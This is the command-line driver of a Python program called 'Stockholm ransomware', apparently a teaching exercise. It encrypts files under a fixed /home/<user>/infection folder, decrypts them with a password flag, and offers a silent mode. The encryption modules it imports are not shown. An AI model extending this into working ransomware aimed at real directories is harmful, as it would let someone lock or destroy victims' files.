import argparse
from scanner import scan_encrypt, scan_decrypt
from encryptor import encrypt_dirs
from decryptor import decrypt_dirs
from getpass import getuser

# Target default directory
user_target = getuser()
user_dir = '/home/'+user_target
default_dir = '/home/'+user_target+'/infection'

# Main
def run():
    # Charge flags config
    args = config_args()
    ## Encrypt directory - forced to default_dir
    if args.reverse == None and args.version == False:
        res_encrypt = scan_encrypt(dir=default_dir,silent=args.silent)
        if len(res_encrypt) > 0:
            encrypt_dirs(lst_dir=res_encrypt,silent=args.silent)
    ## Decrypt directory - forced to default_dir
    if args.reverse != None and args.version == False:
        re_decrypt = scan_decrypt(dir=default_dir,silent=args.silent)
        if len(re_decrypt) > 0:
            decrypt_dirs(key=args.reverse,lst_dir=re_decrypt,silent=args.silent)
    ## Print version program
    if args.version == True:
        print("Program version Stockholm-1.1 - lgomes-o")

# Flags configurations
def config_args():
    parser = argparse.ArgumentParser(
        description= """*** STOCKHOLM RANSOMWARE ***\n
        Encrypt and decrypt multiple files and directories.
        *** WARNING: This program was written for educational purposes.  
        The responsibility for the use and distribution of the tool lies with 
        the user. Use it at your own risk and enjoy! goldcod3-[Don't lose the totem]"""
    )
    # Reverse mode
    parser.add_argument("-r","--reverse",default=None,help="[-r + PASSWORD] Reverse File Encryption.")
    # Silent mode
    parser.add_argument("-s","--silent",default=False,action='store_true',help="Silent mode, the program output is emitted.")
    # Version mode
    parser.add_argument("-v","--version",default=False,action='store_true',help="Print program version.")
    return parser.parse_args()

# Main execution
if __name__ == "__main__":
    run()